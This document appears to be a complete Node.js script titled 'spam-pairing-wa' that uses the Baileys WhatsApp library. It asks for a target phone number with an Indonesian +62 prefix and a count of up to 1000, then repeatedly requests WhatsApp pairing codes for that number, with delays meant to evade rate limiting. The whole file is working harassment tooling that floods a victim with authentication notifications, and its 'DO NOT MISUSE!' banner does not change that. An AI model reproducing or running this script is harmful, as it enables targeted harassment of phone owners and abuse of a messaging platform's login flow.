const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

// Enhanced color system
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m'
};

const colorArray = [colors.red, colors.green, colors.yellow, colors.blue, colors.magenta, colors.cyan];
const wColor = colorArray[Math.floor(Math.random() * colorArray.length)];

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

function showBanner() {
    console.log(colors.cyan + colors.bright + `
╔══════════════════════════════════════════════════════╗
║  ██████╗  █████╗  ██████╗ ██╗   ██╗ ███████╗        ║
║  ██╔══██╗██╔══██╗██╔════╝ ██║   ██║ ██╔════╝        ║
║  ██████╔╝███████║██║  ███╗██║   ██║ ███████╗        ║
║  ██╔══██╗██╔══██║██║   ██║██║   ██║ ╚════██║        ║
║  ██████╔╝██║  ██║╚██████╔╝╚██████╔╝ ███████║        ║
║  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚══════╝        ║
╚══════════════════════════════════════════════════════╝
` + colors.yellow + `
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  █` + colors.green + ` spam-pairing-wa` + colors.yellow + `                                      █
  █` + colors.magenta + ` by Bagus Erlangga` + colors.yellow + `                                 █
  █` + colors.red + ` DO NOT MISUSE!` + colors.yellow + `                                       █
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
` + colors.cyan + `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃` + colors.white + colors.bright + `          FOLLOW THE INSTRUCTIONS BELOW TO SPAM          ` + colors.cyan + `┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃` + colors.green + ` ⭔ Target Number (` + colors.yellow + `62xxxxxxxxxx` + colors.green + `)                     ` + colors.cyan + `┃
┃` + colors.green + ` ⭔ How much spam (` + colors.yellow + `1-1000` + colors.green + `)                          ` + colors.cyan + `┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
` + colors.red + `
  ⚠ THIS TOOL CAN ONLY BE USED ON NUMBER +62 ⚠
` + colors.reset);

    // Blinking "Running..." text
    console.log(colors.green + colors.bright + 'Running...' + colors.reset);
}

async function KleeProject() {
    const { state } = await useMultiFileAuthState('./69/session');
    const KleeBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    
    try {
        // Ask for phone number
        const phoneNumber = await question(wColor + 'Target (62xxxxxxxxxx) : ' + colors.reset);
        
        // Request the desired number of pairing codes
        const KleeCodes = parseInt(await question(wColor + 'Total spam (1-1000) : '+ colors.reset));

        if (isNaN(KleeCodes) || KleeCodes <= 0 || KleeCodes > 1000) {
            console.log(colors.red + 'Please enter a number between 1-1000.' + colors.reset);
            return;
        }

        // Get and display pairing code
        for (let i = 0; i < KleeCodes; i++) {
            try {
                let code = await KleeBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(wColor + `[${i + 1}/${KleeCodes}] ` + colors.green + `Success! Pairing code sent to: ${phoneNumber}` + colors.reset);
                // Add delay between requests to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.error(colors.red + `Error: ${error.message}` + colors.reset);
                // Add delay before retrying
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    } catch (error) {
        console.error(colors.red + 'Error: ' + error.message + colors.reset);
    }

    return KleeBotInc;
}

// Display the banner
showBanner();

// Start the program
KleeProject();